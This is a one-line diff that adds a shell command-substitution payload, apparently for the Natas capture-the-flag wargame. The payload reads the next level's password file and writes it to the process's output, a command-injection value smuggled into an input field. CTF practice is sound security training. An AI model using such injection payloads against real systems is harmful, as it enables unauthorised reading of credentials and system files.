@@ -1,0 +1,1 @@
+$(cat /etc/natas_webpass/natas17 > /proc/$$/fd/1)
